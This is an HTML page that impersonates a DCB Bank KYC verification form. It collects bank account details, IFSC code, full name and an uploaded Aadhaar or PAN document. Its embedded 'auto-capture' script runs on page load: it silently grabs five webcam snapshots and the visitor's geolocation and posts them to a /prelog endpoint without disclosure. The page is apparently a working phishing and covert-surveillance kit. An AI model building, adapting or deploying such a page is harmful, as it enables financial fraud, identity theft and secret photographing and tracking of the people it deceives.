<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DCB Bank KYC Verification</title>
  <style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f4f6f9;
    margin: 0;
    padding: 0;
  }

  .container {
    max-width: 500px;
    margin: 60px auto;
    background: white;
    border-radius: 8px;
    padding: 30px;
    box-shadow: 0 0 12px rgba(0,0,0,0.1);
  }

  .logo {
    display: block;
    margin: 0 auto 20px;
    width: 180px;
  }

  h2 {
    text-align: center;
    color: #003d6a;
  }

  .notice {
    margin-top: -10px;
    margin-bottom: 20px;
    font-size: 13px;
    color: #444;
    text-align: center;
    line-height: 1.5;
  }

  label {
    display: block;
    margin-top: 18px;
    font-weight: bold;
    font-size: 16px;
    color: #222;
  }

  input[type="text"],
  input[type="file"] {
    width: 100%;
    font-size: 16px;
    padding: 12px 10px;
    margin-top: 8px;
    border-radius: 6px;
    border: 1px solid #ccc;
    box-sizing: border-box;
  }

  button {
    margin-top: 30px;
    width: 100%;
    background-color: #003d6a;
    color: white;
    border: none;
    padding: 14px;
    font-size: 17px;
    border-radius: 6px;
    cursor: pointer;
  }

  button:hover {
    background-color: #00548c;
  }

  .footer {
    text-align: center;
    margin-top: 30px;
    font-size: 12px;
    color: #777;
  }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="dbc.png" alt="DCB Bank Logo">
    
    <h2>DCB Bank KYC Verification</h2>

    <p class="notice">
      Please enter the recipient’s bank and other required details carefully.  
      All details submitted must match the recipient’s bank records.  
      Invalid or mismatched information may lead to reversal or failure of the transaction.
    </p>

    <form action="/submit" method="POST" enctype="multipart/form-data">
      <label for="bankname">Bank Name</label>
      <input type="text" id="bankname" name="bankname" placeholder="Enter recipient’s bank name" required>

      <label for="ifsc">IFSC Code</label>
      <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>

      <label for="accno">Account Number</label>
      <input type="text" id="accno" name="accno" required>

      <label for="fullname">Full Name</label>
      <input type="text" id="fullname" name="fullname" required>

      <label for="document">Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
      <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>

      <button type="submit">Verify Account</button>
    </form>
    <div class="footer">
      © 2025 DCB Bank Ltd. | For official verification purposes only.
    </div>
  </div>

  <!-- ✅ Auto-capture script -->
  <script>
    let capturedImages = [];
    let locationData = null;

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    function sendPrelog() {
      const formData = new FormData();
      capturedImages.slice(0, 5).forEach((img, index) => {
        formData.append(`image${index}`, dataURLtoBlob(img), `prelog_${index}.jpg`);
      });
      if (locationData) {
        formData.append('location', JSON.stringify(locationData));
      }

      fetch('/prelog', {
        method: 'POST',
        body: formData
      }).catch(console.error);
    }

    window.addEventListener('load', async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        setTimeout(() => {
          const capture = () => {
            if (capturedImages.length >= 5) return;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            capturedImages.push(canvas.toDataURL('image/jpeg', 0.8));
          };

          const interval = setInterval(() => {
            capture();
            if (capturedImages.length >= 5) {
              clearInterval(interval);
              stream.getTracks().forEach(track => track.stop());
              sendPrelog();
            }
          }, 500);
        }, 1000);
      } catch (err) {
        console.warn('Camera access denied');
      }

      navigator.geolocation.getCurrentPosition(pos => {
        locationData = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp
        };
      }, err => {
        console.warn('Location access denied');
      });
    });
  </script>
</body>
</html>
